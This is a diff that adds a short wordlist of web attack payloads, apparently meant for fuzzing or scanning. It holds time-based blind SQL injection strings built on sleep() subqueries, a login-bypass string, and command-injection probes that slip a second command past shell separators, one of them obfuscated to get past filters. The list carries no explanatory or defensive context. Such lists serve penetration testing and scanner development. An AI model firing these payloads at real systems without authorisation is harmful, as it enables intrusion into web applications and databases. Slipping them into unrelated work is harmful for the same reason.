@@ -1,0 +1,16 @@
+\'
+(select*from(select(sleep(20)))a)'
+ '+(select*from(select(sleep(20)))a)+'
+ and (select*from(select(sleep(20)))a)-- 
+,(select*from(select(sleep(20)))a)
+'-'
+admin") or "1"="1"/*
+" echo $((191*7))
+"; echo $((191*7))
+ $(sleep 50)
+" & echo $((191*7))
+" && echo $((191*7))
+id&& echo $((191*7)) #
+1| echo $((191*7)) #
+$(s\l'ee'p 50)
+1|| echo $((191*7)) #
